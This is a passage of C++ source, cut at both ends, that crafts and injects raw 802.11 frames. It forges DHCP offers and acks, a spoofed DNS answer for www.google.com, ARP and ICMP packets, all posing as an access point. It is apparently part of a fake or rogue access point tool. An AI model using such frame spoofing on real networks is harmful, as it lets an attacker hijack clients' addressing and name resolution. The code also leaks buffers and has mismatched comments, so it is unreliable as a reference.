    rtap->it_len     = htole16(sizeof(ie80211_rtaphdr) + sizeof(flags) + sizeof(dRate) +
                       sizeof(chan_freq) + sizeof(chan_flags));
    rtap->it_present = (1 << IEEE80211_RADIOTAP_FLAGS) | (1 << IEEE80211_RADIOTAP_RATE) |
                       (1 << IEEE80211_RADIOTAP_CHANNEL);

    remBytes -= sizeof(*rtap); // update bytes
    
    // Add On Flags
    if(remBytes < sizeof(flags)) {
        std::cerr << "\nsendDHCP: flags remBytes error\n";
        return -1;
    }

    uint8_t *const flagsPtr = (uint8_t*)((uint8_t*)rtap + sizeof(ie80211_rtaphdr));
    *flagsPtr = flags;

    remBytes -= sizeof(flags); // update bytes

    // Add On Data Rate
    if(remBytes < sizeof(dRate)) {
        std::cerr << "\nsendDHCP: data rate remBytes error\n";
        return -1;
    }

    uint8_t *const dataRatePtr = (uint8_t*)((uint8_t*)flagsPtr + sizeof(flags));
    *dataRatePtr = rate;

    remBytes -= sizeof(dRate); // update bytes

    // Add On Channel
    if(remBytes < sizeof(chan_freq)) {
        std::cerr << "\nsendDHCP: chan freq remBytes error\n";
        return -1;
    }

    uint16_t *const channel_freqPtr = (uint16_t*)((uint8_t*)dataRatePtr + sizeof(dRate));
    *channel_freqPtr = chan_freq;

    remBytes -= sizeof(chan_freq); // update bytes

    // Add On Channel Flags
    if(remBytes < sizeof(chan_flags)) {
        std::cerr << "\nsendDHCP: chan flags remBytes error\n";
        return -1;
    }

    uint16_t *const channel_flagsPtr = (uint16_t*)((uint8_t*)channel_freqPtr + sizeof(chan_freq));
    *channel_flagsPtr = chan_flags;

    remBytes -= sizeof(chan_flags); // update bytes

    // Configure 80211 Header
    if(remBytes < sizeof(ieee80211_hdr3)) {
        std::cerr << "\nsendDHCP: ieee80211 hdr remBytes error\n";
        return -1;
    }
    
    ieee80211_hdr3 *const data = (ieee80211_hdr3*)((uint8_t*)channel_flagsPtr + sizeof(chan_flags));

    data->frame_control |= 0x0200;                    // version 0, fromDS(0x01)
    data->duration_id    = htole16(304);              // 304 microsecs
    data->seq_ctrl       = htole16((++seqNum) << 4);  // seq + frag, just update seq
    data->frame_control |= WIFI_DATA;                 // OR in Type, Subtype
    std::memcpy(data->addr1, tha,          ETH_ALEN); // DA
    std::memcpy(data->addr2, apd->macAddr, ETH_ALEN); // BSSID
    std::memcpy(data->addr3, apd->macAddr, ETH_ALEN); // SA
    
    remBytes -= sizeof(ieee80211_hdr3); // update bytes

    // Configure LLC_SNAP
    llc_snap_hdr *const llcS = (llc_snap_hdr*)((uint8_t*)data + sizeof(ieee80211_hdr3));   
    if(remBytes < sizeof(llc_snap_hdr)) {
        std::cerr << "\nsendDHCP: llc_snap hdr remBytes error\n";
        return -1;
    }

    // LLC Part
    llcS->dsap  = 0xAA; // snap
    llcS->ssap  = 0xAA; // snap
    llcS->ctrl1 = 0x03; // unnumbered frame(U-Frame)

    // SNAP Part
    std::memcpy(llcS->oui, oui_rfc1042, OUI_LEN); // ethernet encapsulation
    llcS->ether_type = htons(ETH_P_IP); // ip

    remBytes -= sizeof(llc_snap_hdr); // update bytes
       
    // Configure IP
    iphdr *const ip = (iphdr*)((uint8_t*)llcS + sizeof(llc_snap_hdr)); 
    if(remBytes < sizeof(iphdr)) {
        std::cerr << "\nsendDHCP: ip hdr remBytes error\n";
        return -1;
    } 
    
    ip->version  = IPVERSION; // IPv4
    ip->ihl      = 5; // 20 bytes(5 * 4)
    ip->tos      = IPTOS_PREC_ROUTINE; // routine
    ip->tot_len  = htons(sizeof(iphdr) + sizeof(udphdr) + sizeof(dhcphdr) + sizeof(dhcp_options));
    ip->id       = htons(random());
    ip->frag_off = 0;
    ip->ttl      = IPDEFTTL; // default ttl(64)
    ip->protocol = IPPROTO_UDP; // icmp
    ip->check    = 0; // calc later

    sockaddr_in sin;
    uint8_t     sip[IP_ALEN];
    inet_aton("192.168.0.2", &sin.sin_addr);
    std::memcpy(sip, &sin.sin_addr, IP_ALEN);

    sockaddr_in ip_bcast_sin;
    uint8_t     ip_bcast[IP_ALEN];
    inet_aton("255.255.255.255", &ip_bcast_sin.sin_addr);
    std::memcpy(ip_bcast, &ip_bcast_sin.sin_addr, IP_ALEN);

    std::memcpy((void*)&ip->saddr, sip,      IP_ALEN); // SA
    std::memcpy((void*)&ip->daddr, ip_bcast, IP_ALEN); // DA
    
    // Now Calc IP Checksum
    ip->check = checksum((uint16_t*)ip, sizeof(iphdr));

    remBytes -= sizeof(iphdr); // update bytes

    // Configure UDP
    udphdr *const udp = (udphdr*)((uint8_t*)ip + (ip->ihl * 4)); 
    if(remBytes < sizeof(udphdr)) {
        std::cerr << "\nsendDHCP: udp hdr remBytes error\n";
        return -1;
    }

    udp->source = htons(BOOTPS_PORT); // bootps
    udp->dest   = htons(BOOTPC_PORT); // bootpc
    udp->len    = htons(sizeof(udphdr) + sizeof(dhcphdr) + sizeof(dhcp_options));
    udp->check  = 0; // calc later

    remBytes -= sizeof(udphdr); // update bytes   

    // Configure DHCP Bootstrap Protocol
    dhcphdr *const dhcp = (dhcphdr*)((uint8_t*)udp + sizeof(udphdr)); 
    if(remBytes < sizeof(dhcphdr)) {
        std::cerr << "\nsendDHCP: dhcp hdr remBytes error\n";
        return -1;
    }
    
    dhcp->op    = BOOTP_REPLY;
    dhcp->htype = 0x01; // ARPHRD_ETHER;
    dhcp->hlen  = ETH_ALEN;
    dhcp->hops  = 0;
    dhcp->xid   = dhcp_xid;
    dhcp->secs  = 0;
    dhcp->flags = 0; // unicast

    std::memset((void*)&dhcp->ciaddr.s_addr, 0, IP_ALEN); // client, 0.0.0.0

    std::memcpy((void*)&dhcp->yiaddr.s_addr, tip, IP_ALEN); // client IP
    std::memcpy((void*)&dhcp->siaddr.s_addr, sip, IP_ALEN); // next server, our IP

    std::memset((void*)&dhcp->giaddr.s_addr, 0, IP_ALEN); // relay, 0.0.0.0

    std::memcpy((void*)dhcp->chaddr, tha, ETH_ALEN); // client ha mac

    std::memset((void*)dhcp->sname, 0, 64);  // zero
    std::memset((void*)dhcp->file,  0, 128); // zero

    dhcp->magic = htonl(DHCP_MAGIC_COOKIE);

    remBytes -= sizeof(dhcphdr); // update bytes   

    // Add DHCP Options
    dhcp_options *dhcp_o = (dhcp_options*)((uint8_t*)dhcp + sizeof(dhcphdr));
    if(remBytes < sizeof(dhcp_options)) {
        std::cerr << "\nsendDHCP: dhcp options hdr remBytes error\n";
        return -1;
    }

    // Check DHCP Msg Type
    if(dhcp_type == 5) // ack
        std::memcpy((void*)dhcp_o, (const void*)&apd_dhcp0_ack,   sizeof(dhcp_options));
    else               // offer
        std::memcpy((void*)dhcp_o, (const void*)&apd_dhcp0_offer, sizeof(dhcp_options));       

    remBytes -= sizeof(dhcp_options); // update bytes

    // Now Calc UDP Psudeo Header Checksum
    //udp->check = checksumUDP((uint16_t*)&udp, sizeof(udphdr) + sizeof(dhcphdr) + sizeof(dhcp_options), (uint8_t*)"192.168.0.2", tip);/////////////////////////////////////////////////////////////////

    // Add Frame Check Sequence(CRC32 over data - radiotap)
    uint32_t *fcs = (uint32_t*)((uint8_t*)dhcp_o + sizeof(dhcp_options));   
    if(remBytes < sizeof(uint32_t)) {
        std::cerr << "\nsendDHCP: FCS remBytes error\n";
        return -1;
    }

    *fcs = htole32(calc_crc32(packet + le16toh(rtap->it_len), DHCP_SIZE - le16toh(rtap->it_len) - sizeof(uint32_t))); // checksum
    
    remBytes -= sizeof(uint32_t); // update bytes

    // Check Remaining Bytes
    if(remBytes) {
        std::cerr << "\nsendDHCP: ending remBytes error\n";
        return -1;
    }

    // Get Interface Index
    std::strncpy(ifr.ifr_name, iface, IFNAMSIZ); // copy in interface device
    if(ioctl(sfd, SIOCGIFINDEX, &ifr) == -1) {
        std::perror("sendDHCP: ioctl - SIOCGIFINDEX");
        return -1;
    }

    // Set Up Socket Link-Layer Address
    dll.sll_ifindex  = ifr.ifr_ifindex;
    dll.sll_family   = AF_PACKET;
    dll.sll_protocol = htons(ETH_P_802_2);
    dll.sll_hatype   = htons(ARPHRD_IEEE80211_RADIOTAP);
    //dll.sll_pkttype  = PACKET_OTHERHOST;
    //dll.sll_halen    = ETH_ALEN;
    //std::memcpy(&dll.sll_addr, ether_aton((const char*)da), ETH_ALEN);

    // Send Packet
    if(sendto(sfd, packet, DHCP_SIZE, 0, (sockaddr*)&dll, sizeof(sockaddr_ll)) == -1) {
        std::perror("sendDHCP: sendto");
        return -1;
    }

    // Success
    return 0;
}

int sendDNS(const APDescriptor *const apd, const uint8_t chan, const uint8_t dRate, const char *const iface,
            const uint8_t *const tip, const uint8_t *const tha, const uint32_t dns_xid, const int sfd) {
    // Check Values
    if(!apd || !iface || !tip || !tha) {
        std::cerr << "\nsendDNS: value error\n";
        return -1;
    }
    
    // Declarations
    ifreq       ifr;
    sockaddr_ll dll;

    // Zero Out
    std::memset(&ifr, 0, sizeof(ifr));
    std::memset(&dll, 0, sizeof(dll)); 

    // Set Rate
    uint8_t rate  = dRate & IEEE80211_RATE_VAL,
            flags = IEEE80211_RADIOTAP_F_FCS;

    // Get Channel
    uint16_t chan_freq = chan_to_freq(chan);
    if(!chan_freq) {
        return -1;
        std::cerr << "\nsendDNS: channel error";
    }

    uint16_t chan_flags = IEEE80211_CHAN_OFDM | IEEE80211_CHAN_2GHZ; // 0x00c0, OFDN + 2Ghz (pure-g)

    // Beacon Size
    std::size_t DNS_SIZE = sizeof(ie80211_rtaphdr) + sizeof(flags) + sizeof(dRate) +
                           sizeof(chan_freq) + sizeof(chan_flags) + sizeof(ieee80211_hdr3) +
                           sizeof(llc_snap_hdr) + sizeof(iphdr) + sizeof(udphdr) + sizeof(dnshdr) +
                           sizeof(dns_question) + sizeof(dns_ans_auth_add )+ sizeof(uint32_t/* FCS */);

    // Alloc Frame
    uint8_t *const packet = (uint8_t*)std::malloc(DNS_SIZE);
    if(!packet) {
        std::perror("sendDNS: malloc");
        return -1;
    }

    uint32_t remBytes = DNS_SIZE; // remaining bytes

    // Configure Radiotap
    if(remBytes < sizeof(ie80211_rtaphdr)) {
        std::cerr << "\nsendDNS: rtap remBytes error\n";
        return -1;
    }

    ie80211_rtaphdr *const rtap = (ie80211_rtaphdr*)((uint8_t*)packet);
    rtap->it_version = 0;
    rtap->it_len     = htole16(sizeof(ie80211_rtaphdr) + sizeof(flags) + sizeof(dRate) +
                       sizeof(chan_freq) + sizeof(chan_flags));
    rtap->it_present = (1 << IEEE80211_RADIOTAP_FLAGS) | (1 << IEEE80211_RADIOTAP_RATE) |
                       (1 << IEEE80211_RADIOTAP_CHANNEL);

    remBytes -= sizeof(*rtap); // update bytes
    
    // Add On Flags
    if(remBytes < sizeof(flags)) {
        std::cerr << "\nsendDNS: flags remBytes error\n";
        return -1;
    }

    uint8_t *const flagsPtr = (uint8_t*)((uint8_t*)rtap + sizeof(ie80211_rtaphdr));
    *flagsPtr = flags;

    remBytes -= sizeof(flags); // update bytes

    // Add On Data Rate
    if(remBytes < sizeof(dRate)) {
        std::cerr << "\nsendDNS: data rate remBytes error\n";
        return -1;
    }

    uint8_t *const dataRatePtr = (uint8_t*)((uint8_t*)flagsPtr + sizeof(flags));
    *dataRatePtr = rate;

    remBytes -= sizeof(dRate); // update bytes

    // Add On Channel
    if(remBytes < sizeof(chan_freq)) {
        std::cerr << "\nsendDNS: chan freq remBytes error\n";
        return -1;
    }

    uint16_t *const channel_freqPtr = (uint16_t*)((uint8_t*)dataRatePtr + sizeof(dRate));
    *channel_freqPtr = chan_freq;

    remBytes -= sizeof(chan_freq); // update bytes

    // Add On Channel Flags
    if(remBytes < sizeof(chan_flags)) {
        std::cerr << "\nsendDNS: chan flags remBytes error\n";
        return -1;
    }

    uint16_t *const channel_flagsPtr = (uint16_t*)((uint8_t*)channel_freqPtr + sizeof(chan_freq));
    *channel_flagsPtr = chan_flags;

    remBytes -= sizeof(chan_flags); // update bytes

    // Configure 80211 Header
    if(remBytes < sizeof(ieee80211_hdr3)) {
        std::cerr << "\nsendDNS: ieee80211 hdr remBytes error\n";
        return -1;
    }
    
    ieee80211_hdr3 *const data = (ieee80211_hdr3*)((uint8_t*)channel_flagsPtr + sizeof(chan_flags));

    data->frame_control |= 0x0200;                    // version 0, fromDS(0x01)
    data->duration_id    = 0;
    data->seq_ctrl       = htole16((++seqNum) << 4);  // seq + frag, just update seq
    data->frame_control |= WIFI_DATA;                 // OR in Type, Subtype
    std::memcpy(data->addr1, tha,          ETH_ALEN); // DA
    std::memcpy(data->addr2, apd->macAddr, ETH_ALEN); // BSSID
    std::memcpy(data->addr3, apd->macAddr, ETH_ALEN); // SA
    
    remBytes -= sizeof(ieee80211_hdr3); // update bytes

    // Configure LLC_SNAP
    llc_snap_hdr *const llcS = (llc_snap_hdr*)((uint8_t*)data + sizeof(ieee80211_hdr3));   
    if(remBytes < sizeof(llc_snap_hdr)) {
        std::cerr << "\nsendDNS: llc_snap hdr remBytes error\n";
        return -1;
    }

    // LLC Part
    llcS->dsap  = 0xAA; // snap
    llcS->ssap  = 0xAA; // snap
    llcS->ctrl1 = 0x03; // unnumbered frame(U-Frame)

    // SNAP Part
    std::memcpy(llcS->oui, oui_rfc1042, OUI_LEN); // ethernet encapsulation
    llcS->ether_type = htons(ETH_P_IP); // ip

    remBytes -= sizeof(llc_snap_hdr); // update bytes
       
    // Configure IP
    iphdr *const ip = (iphdr*)((uint8_t*)llcS + sizeof(llc_snap_hdr)); 
    if(remBytes < sizeof(iphdr)) {
        std::cerr << "\nsendDNS: ip hdr remBytes error\n";
        return -1;
    } 
    
    ip->version  = IPVERSION; // IPv4
    ip->ihl      = 5; // 20 bytes(5 * 4)
    ip->tos      = IPTOS_PREC_ROUTINE; // routine
    ip->tot_len  = htons(sizeof(iphdr) + sizeof(udphdr) + sizeof(dnshdr) + sizeof(dns_question) + sizeof(dns_ans_auth_add));
    ip->id       = htons(random());
    ip->frag_off = 0;
    ip->ttl      = IPDEFTTL; // default ttl(64)
    ip->protocol = IPPROTO_UDP; // icmp
    ip->check    = 0; // calc later

    sockaddr_in sin;
    uint8_t     sip[IP_ALEN];
    inet_aton("192.168.0.2", &sin.sin_addr);
    std::memcpy(sip, &sin.sin_addr, IP_ALEN);

    std::memcpy((void*)&ip->saddr, sip, IP_ALEN); // SA
    std::memcpy((void*)&ip->daddr, tip, IP_ALEN); // DA
    
    // Now Calc IP Checksum
    ip->check = checksum((uint16_t*)ip, sizeof(iphdr));

    remBytes -= sizeof(iphdr); // update bytes

    // Configure UDP
    udphdr *const udp = (udphdr*)((uint8_t*)ip + (ip->ihl * 4)); 
    if(remBytes < sizeof(udphdr)) {
        std::cerr << "\nsendDNS: udp hdr remBytes error\n";
        return -1;
    }

    udp->source = htons(53);    // domain
    udp->dest   = htons(56794); // ephemeral port
    udp->len    = htons(sizeof(udphdr) + sizeof(dnshdr) + sizeof(dns_question) + sizeof(dns_ans_auth_add));
    udp->check  = 0; // calc later

    remBytes -= sizeof(udphdr); // update bytes   

    // Configure DNS
    dnshdr *const dns = (dnshdr*)((uint8_t*)udp + sizeof(udphdr));
    if(remBytes < sizeof(dnshdr)) {
        std::cerr << "\nsendDNS: dns hdr remBytes error\n";
        return -1;
    }

    dns->xid     = dns_xid;
    dns->flags   = htons(0x8180); // qr = response(1), op = standard(0), rd = recursive(1), ra = server recursive(1)
    dns->qdcount = htons(0x0001); // 1 entry in question section
    dns->ancount = htons(0x0001); // 1 resource records in anser section
    dns->nscount = 0; // no name servers records in authority section
    dns->arcount = 0; // no resource records in additional section

    remBytes -= sizeof(dnshdr); // update bytes

    // DNS Question Section
    dns_question *const dns_q = (dns_question*)((uint8_t*)dns + sizeof(dnshdr));
    if(remBytes < sizeof(dns_question)) {
        std::cerr << "\nsendDNS: dns question hdr remBytes error\n";
        return -1;
    }

    const uint8_t qname[16] = { 0x03, 0x77, 0x77, 0x77, 0x06, 0x67, 0x6f, 0x6f, 0x67, 0x6c,
                                0x65, 0x03, 0x63, 0x6f, 0x6d, 0x00 }; // www.google.com

    std::memcpy(dns_q->qname, qname, 16); // www.google.com
    dns_q->qtype  = htons(0x0001);        // A(IPv4) Host Addr
    dns_q->qclass = htons(0x0001);        // IN

    remBytes -= sizeof(dns_question); // update bytes

    // DNS Answer Section
    dns_ans_auth_add *const dns_a = (dns_ans_auth_add*)((uint8_t*)dns_q + sizeof(dns_question));
    if(remBytes < sizeof(dns_question)) {
        std::cerr << "\nsendDNS: dns answer hdr remBytes error\n";
        return -1;
    }

    dns_a->aname    = htons(0xc00c);     // www.google.com
    dns_a->atype    = htons(0x0001);     // A(IPv4) Host Addr
    dns_a->aclass   = htons(0x0001);     // IN
    dns_a->ttl      = htonl(0x00000058); // 1 min and 28 sec
    dns_a->rdlength = htons(IP_ALEN);    // IPv4
    dns_a->rdata    = htonl(0xadc2c86a); // 173.184.200.106

    remBytes -= sizeof(dns_ans_auth_add); // update bytes

    // Add Frame Check Sequence(CRC32 over data - radiotap)
    uint32_t *fcs = (uint32_t*)((uint8_t*)dns_a + sizeof(dns_ans_auth_add));   
    if(remBytes < sizeof(uint32_t)) {
        std::cerr << "\nsendDNS: FCS remBytes error\n";
        return -1;
    }

    *fcs = htole32(calc_crc32(packet + le16toh(rtap->it_len), DNS_SIZE - le16toh(rtap->it_len) - sizeof(uint32_t))); // checksum
    
    remBytes -= sizeof(uint32_t); // update bytes

    // Check Remaining Bytes
    if(remBytes) {
        std::cerr << "\nsendDNS: ending remBytes error\n";
        return -1;
    }

    // Get Interface Index
    std::strncpy(ifr.ifr_name, iface, IFNAMSIZ); // copy in interface device
    if(ioctl(sfd, SIOCGIFINDEX, &ifr) == -1) {
        std::perror("sendDNS: ioctl - SIOCGIFINDEX");
        return -1;
    }

    // Set Up Socket Link-Layer Address
    dll.sll_ifindex  = ifr.ifr_ifindex;
    dll.sll_family   = AF_PACKET;
    dll.sll_protocol = htons(ETH_P_802_2);
    dll.sll_hatype   = htons(ARPHRD_IEEE80211_RADIOTAP);
    //dll.sll_pkttype  = PACKET_OTHERHOST;
    //dll.sll_halen    = ETH_ALEN;
    //std::memcpy(&dll.sll_addr, ether_aton((const char*)da), ETH_ALEN);

    // Send Packet
    if(sendto(sfd, packet, DNS_SIZE, 0, (sockaddr*)&dll, sizeof(sockaddr_ll)) == -1) {
        std::perror("sendDNS: sendto");
        return -1;
    }

    // Success
    return 0;
}

int sendARP(const APDescriptor *const apd, const uint8_t chan, const uint8_t dRate, const char *const iface,
            const uint8_t *const tip, const uint8_t *const tha, const uint16_t opcode, const int sfd) {
    // Check Values
    if(!apd || !iface || !tip || !tha) {
        std::cerr << "\nsendARP: value error\n";
        return -1;
    }
    
    // Declarations
    ifreq       ifr;
    sockaddr_ll dll;

    // Zero Out
    std::memset(&ifr, 0, sizeof(ifr));
    std::memset(&dll, 0, sizeof(dll)); 

    // Set Rate
    uint8_t rate  = dRate & IEEE80211_RATE_VAL,
            flags = IEEE80211_RADIOTAP_F_FCS;

    // Get Channel
    uint16_t chan_freq = chan_to_freq(chan);
    if(!chan_freq) {
        return -1;
        std::cerr << "\nsendARP: channel error";
    }

    uint16_t chan_flags = IEEE80211_CHAN_OFDM | IEEE80211_CHAN_2GHZ; // 0x00c0, OFDN + 2Ghz (pure-g)

    // Beacon Size
    std::size_t ARP_SIZE = sizeof(ie80211_rtaphdr) + sizeof(flags) + sizeof(dRate) +
                           sizeof(chan_freq) + sizeof(chan_flags) + sizeof(ieee80211_hdr3) +
                           sizeof(llc_snap_hdr) + sizeof(arphdr2) + sizeof(uint32_t/* FCS */);

    // Alloc Frame
    uint8_t *const packet = (uint8_t*)std::malloc(ARP_SIZE);
    if(!packet) {
        std::perror("sendARP: malloc");
        return -1;
    }

    uint32_t remBytes = ARP_SIZE; // remaining bytes

    // Configure Radiotap
    if(remBytes < sizeof(ie80211_rtaphdr)) {
        std::cerr << "\nsendARP: rtap remBytes error\n";
        return -1;
    }

    ie80211_rtaphdr *const rtap = (ie80211_rtaphdr*)((uint8_t*)packet);
    rtap->it_version = 0;
    rtap->it_len     = htole16(sizeof(ie80211_rtaphdr) + sizeof(flags) + sizeof(dRate) +
                       sizeof(chan_freq) + sizeof(chan_flags));
    rtap->it_present = (1 << IEEE80211_RADIOTAP_FLAGS) | (1 << IEEE80211_RADIOTAP_RATE) |
                       (1 << IEEE80211_RADIOTAP_CHANNEL);

    remBytes -= sizeof(*rtap); // update bytes
    
    // Add On Flags
    if(remBytes < sizeof(flags)) {
        std::cerr << "\nsendARP: flags remBytes error\n";
        return -1;
    }

    uint8_t *const flagsPtr = (uint8_t*)((uint8_t*)rtap + sizeof(ie80211_rtaphdr));
    *flagsPtr = flags;

    remBytes -= sizeof(flags); // update bytes

    // Add On Data Rate
    if(remBytes < sizeof(dRate)) {
        std::cerr << "\nsendARP: data rate remBytes error\n";
        return -1;
    }

    uint8_t *dataRatePtr = (uint8_t*)((uint8_t*)flagsPtr + sizeof(flags));
    *dataRatePtr = rate;

    remBytes -= sizeof(dRate); // update bytes

    // Add On Channel
    if(remBytes < sizeof(chan_freq)) {
        std::cerr << "\nsendARP: chan freq remBytes error\n";
        return -1;
    }

    uint16_t *const channel_freqPtr = (uint16_t*)((uint8_t*)dataRatePtr + sizeof(dRate));
    *channel_freqPtr = chan_freq;

    remBytes -= sizeof(chan_freq); // update bytes

    // Add On Channel Flags
    if(remBytes < sizeof(chan_flags)) {
        std::cerr << "\nsendARP: chan flags remBytes error\n";
        return -1;
    }

    uint16_t *const channel_flagsPtr = (uint16_t*)((uint8_t*)channel_freqPtr + sizeof(chan_freq));
    *channel_flagsPtr = chan_flags;

    remBytes -= sizeof(chan_flags); // update bytes

    // Configure 80211 Header
    if(remBytes < sizeof(ieee80211_hdr3)) {
        std::cerr << "\nsendARP: ieee80211 hdr remBytes error\n";
        return -1;
    }
    
    ieee80211_hdr3 *const data = (ieee80211_hdr3*)((uint8_t*)channel_flagsPtr + sizeof(chan_flags));

    data->frame_control |= 0x0200; // version 0, fromDS(0x02)
    data->duration_id    = 0;
    data->seq_ctrl       = htole16((++seqNum) << 4); // seq + frag, just update seq
    data->frame_control |= WIFI_DATA; // OR in Type, Subtype
    std::memcpy(data->addr1, tha,          ETH_ALEN); // DA
    std::memcpy(data->addr2, apd->macAddr, ETH_ALEN); // BSSID
    std::memcpy(data->addr3, apd->macAddr, ETH_ALEN); // SA

    remBytes -= sizeof(ieee80211_hdr3); // update bytes

    // Configure LLC_SNAP
    llc_snap_hdr *const llcS = (llc_snap_hdr*)((uint8_t*)data + sizeof(ieee80211_hdr3));   
    if(remBytes < sizeof(llc_snap_hdr)) {
        std::cerr << "\nsendARP: llc_snap hdr remBytes error\n";
        return -1;
    }

    // LLC Part
    llcS->dsap  = 0xAA; // snap
    llcS->ssap  = 0xAA; // snap
    llcS->ctrl1 = 0x03; // unnumbered frame(U-Frame)

    // SNAP Part
    std::memcpy(llcS->oui, oui_rfc1042, OUI_LEN); // ethernet encapsulation
    llcS->ether_type = htons(ETH_P_ARP); // arp

    remBytes -= sizeof(llc_snap_hdr); // update bytes
    
    // Configure ARP
    arphdr2 *const arp = (arphdr2*)((uint8_t*)llcS + sizeof(llc_snap_hdr));   
    if(remBytes < sizeof(arphdr2)) {
        std::cerr << "\nsendARP: arp hdr remBytes error\n";
        return -1;
    }

    arp->ar_hrd = htons(ARPHRD_ETHER);
    arp->ar_pro = htons(ETH_P_IP);
    arp->ar_hln = ETH_ALEN;
    arp->ar_pln = IP_ALEN;
    arp->ar_op  = htons(opcode);

    sockaddr_in sin;
    uint8_t     sip[IP_ALEN];
    inet_aton("192.168.0.2", &sin.sin_addr);
    std::memcpy(sip, &sin.sin_addr, IP_ALEN);

    std::memcpy(arp->ar_sha, apd->macAddr, ETH_ALEN); // SA
    std::memcpy(arp->ar_sip, sip,          IP_ALEN);  // SIP

    // Check For MAC BCast
    if(!memcmp(tha, IEEE80211_BCAST_ADDR, ETH_ALEN)) // MAC BCast
        std::memcpy(arp->ar_tha, ARP_BCAST_ADDR, ETH_ALEN); // DA
    else // Regular tha(DA)
        std::memcpy(arp->ar_tha, tha, ETH_ALEN); // DA
    
    std::memcpy(arp->ar_tip, tip, IP_ALEN);  // DIP

    remBytes -= sizeof(arphdr2); // update bytes   

    // Add Frame Check Sequence(CRC32 over data - radiotap)
    uint32_t *fcs = (uint32_t*)((uint8_t*)arp + sizeof(arphdr2));   
    if(remBytes < sizeof(uint32_t)) {
        std::cerr << "\nsendARP: FCS remBytes error\n";
        return -1;
    }

    *fcs = htole32(calc_crc32(packet + le16toh(rtap->it_len), ARP_SIZE - le16toh(rtap->it_len) - sizeof(uint32_t))); // checksum
    
    remBytes -= sizeof(uint32_t); // update bytes

    // Check Remaining Bytes
    if(remBytes) {
        std::cerr << "\nsendARP: ending remBytes error\n";
        return -1;
    }

    // Get Interface Index
    std::strncpy(ifr.ifr_name, iface, IFNAMSIZ); // copy in interface device
    if(ioctl(sfd, SIOCGIFINDEX, &ifr) == -1) {
        std::perror("sendARP: ioctl - SIOCGIFINDEX");
        return -1;
    }

    // Set Up Socket Link-Layer Address
    dll.sll_ifindex  = ifr.ifr_ifindex;
    dll.sll_family   = AF_PACKET;
    dll.sll_protocol = htons(ETH_P_802_2);
    dll.sll_hatype   = htons(ARPHRD_IEEE80211_RADIOTAP);
    //dll.sll_pkttype  = PACKET_OTHERHOST;
    //dll.sll_halen    = ETH_ALEN;
    //std::memcpy(&dll.sll_addr, ether_aton((const char*)da), ETH_ALEN);

    // Send Frame   
    if(sendto(sfd, packet, ARP_SIZE, 0, (sockaddr*)&dll, sizeof(sockaddr_ll)) == -1) {
        std::perror("sendARP: sendto");
        return -1;
    }
    
    // Success
    return 0;
}

int sendICMP(const APDescriptor *const apd, const uint8_t chan, const uint8_t dRate, const char *const iface,
             const uint8_t *const tip, const uint8_t *const tha, const uint8_t icmp_type, const uint8_t icmp_code,
             const int sfd) {
    // Check Values
    if(!apd || !iface || !tip || !tha) {
        std::cerr << "\nsendICMP: value error\n";
        return -1;
    }
    
    // Declarations
    ifreq       ifr;
    sockaddr_ll dll;

    // Zero Out
    std::memset(&ifr, 0, sizeof(ifr));
    std::memset(&dll, 0, sizeof(dll)); 

    // Set Rate
    uint8_t rate  = dRate & IEEE80211_RATE_VAL,
            flags = IEEE80211_RADIOTAP_F_FCS;

    // Get Channel
    uint16_t chan_freq = chan_to_freq(chan);
    if(!chan_freq) {
        return -1;
        std::cerr << "\nsendICMP: channel error";
    }

    uint16_t chan_flags = IEEE80211_CHAN_OFDM | IEEE80211_CHAN_2GHZ; // 0x00c0, OFDN + 2Ghz (pure-g)

    // Beacon Size
    std::size_t ICMP_SIZE = sizeof(ie80211_rtaphdr) + sizeof(flags) + sizeof(dRate) +
                            sizeof(chan_freq) + sizeof(chan_flags) + sizeof(ieee80211_hdr3) +
                            sizeof(llc_snap_hdr) + sizeof(iphdr) + sizeof(icmphdr) +
                            sizeof(uint32_t/* FCS */);

    // Alloc Frame
    uint8_t *const packet = (uint8_t*)std::malloc(ICMP_SIZE);
    if(!packet) {
        std::perror("sendICMP: malloc");
        return -1;
    }

    uint32_t remBytes = ICMP_SIZE; // remaining bytes

    // Configure Radiotap
    if(remBytes < sizeof(ie80211_rtaphdr)) {
        std::cerr << "\nsendICMP: rtap remBytes error\n";
        return -1;
    }

    ie80211_rtaphdr *const rtap = (ie80211_rtaphdr*)((uint8_t*)packet);
    rtap->it_version = 0;
    rtap->it_len     = htole16(sizeof(ie80211_rtaphdr) + sizeof(flags) + sizeof(dRate) +
                       sizeof(chan_freq) + sizeof(chan_flags));
    rtap->it_present = (1 << IEEE80211_RADIOTAP_FLAGS) | (1 << IEEE80211_RADIOTAP_RATE) |
                       (1 << IEEE80211_RADIOTAP_CHANNEL);

    remBytes -= sizeof(*rtap); // update bytes
    
    // Add On Flags
    if(remBytes < sizeof(flags)) {
        std::cerr << "\nsendICMP: flags remBytes error\n";
        return -1;
    }

    uint8_t *const flagsPtr = (uint8_t*)((uint8_t*)rtap + sizeof(ie80211_rtaphdr));
    *flagsPtr = flags;

    remBytes -= sizeof(flags); // update bytes

    // Add On Data Rate
    if(remBytes < sizeof(dRate)) {
        std::cerr << "\nsendICMP: data rate remBytes error\n";
        return -1;
    }

    uint8_t *const dataRatePtr = (uint8_t*)((uint8_t*)flagsPtr + sizeof(flags));
    *dataRatePtr = rate;

    remBytes -= sizeof(dRate); // update bytes

    // Add On Channel
    if(remBytes < sizeof(chan_freq)) {
        std::cerr << "\nsendICMP: chan freq remBytes error\n";
        return -1;
    }

    uint16_t *const channel_freqPtr = (uint16_t*)((uint8_t*)dataRatePtr + sizeof(dRate));
    *channel_freqPtr = chan_freq;

    remBytes -= sizeof(chan_freq); // update bytes

    // Add On Channel Flags
    if(remBytes < sizeof(chan_flags)) {
        std::cerr << "\nsendICMP: chan flags remBytes error\n";
        return -1;
    }

    uint16_t *const channel_flagsPtr = (uint16_t*)((uint8_t*)channel_freqPtr + sizeof(chan_freq));
    *channel_flagsPtr = chan_flags;

    remBytes -= sizeof(chan_flags); // update bytes

    // Configure 80211 Header
    if(remBytes < sizeof(ieee80211_hdr3)) {
        std::cerr << "\nsendICMP: ieee80211 hdr remBytes error\n";
        return -1;
    }
    
    ieee80211_hdr3 *const data = (ieee80211_hdr3*)((uint8_t*)channel_flagsPtr + sizeof(chan_flags));

    data->frame_control |= 0x0200; // version 0, fromDS
    data->duration_id    = 0;
    data->seq_ctrl       = htole16((++seqNum) << 4); // seq + frag, just update seq
    data->frame_control |= WIFI_DATA;                // OR in Type, Subtype
    std::memcpy(data->addr1, tha,          ETH_ALEN); // DA
    std::memcpy(data->addr2, apd->macAddr, ETH_ALEN); // BSSID
